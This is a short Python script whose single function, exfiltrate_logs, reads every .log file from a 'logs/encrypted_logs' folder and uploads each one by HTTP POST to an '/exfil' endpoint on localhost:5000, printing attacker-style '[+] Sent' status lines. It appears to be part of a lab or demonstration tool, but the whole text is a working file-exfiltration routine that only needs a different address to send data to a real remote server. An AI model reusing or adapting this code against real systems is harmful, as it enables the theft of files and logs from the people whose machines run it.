import requests
import os

LOG_DIR = "logs/encrypted_logs"

def exfiltrate_logs():
    for filename in os.listdir(LOG_DIR):
        if filename.endswith(".log"):
            filepath = os.path.join(LOG_DIR, filename)
            with open(filepath, 'rb') as f:
                data = f.read()

            try:
                res = requests.post("http://localhost:5000/exfil", files={"file": (filename, data)})
                print(f"[+] Sent {filename}, status: {res.status_code}")
            except Exception as e:
                print(f"[!] Error sending {filename}: {e}")
